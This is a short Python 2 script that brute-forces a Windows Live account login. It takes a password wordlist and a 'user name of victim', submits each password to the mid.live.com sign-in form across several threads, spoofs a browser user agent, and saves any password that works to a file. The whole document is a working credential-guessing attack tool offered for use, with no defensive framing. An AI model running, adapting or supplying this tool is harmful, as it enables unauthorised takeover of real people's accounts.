import mechanize
import threading
import cookielib



def chunkIt(seq, num):
    avg = len(seq) / float(num)
    out = []
    last = 0.0
    while last < len(seq):
        out.append(seq[int(last):int(last + avg)])
        last += avg
    return out




def check(acs, newfile):
    for a in acs:
        try:
            if a.endswith('\n'):
                a = a[:-1]
            if a:
                br = mechanize.Browser()
                br.set_handle_robots(False)
                br.addheaders = [('User-agent', 'Mozilla/5.0 (Windows; Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0')]
                br.open('http://mid.live.com/si/login.aspx')
                br.select_form(nr=0)
                br.form['LoginTextBox'] = username
                br.form['PasswordTextBox'] = a
                br.submit()
                if 'information you entered is incorrect.' in br.response().read() or 'We were unable to sign you in with your Windows Live ID' in br.response().read():
                    print 'Could not bruteforce with password ' + a
                else:
                    print 'Account: bruteforced with ' + a
                    opn = open(newfile, 'a')
                    opn.write(a + '\n')
                    opn.close()
                    break
            else:
                pass

        except:
            print 'Error with ' + str(a)

acs = open(raw_input('File with passwords: ')).readlines()
username = raw_input('user name of victim: ')
newfile = raw_input('File to save the pass into: ')
nbthreads = input('Number of threads: ')
if len(acs) > nbthreads:
    z = chunkIt(acs, nbthreads)
    for passz in z:
        threading.Thread(target=check, args=(passz,newfile)).start()
else:
        z = chunkIt(acs, len(acs))
        for passz in z:
                threading.Thread(target=check, args=(passz,newfile)).start()


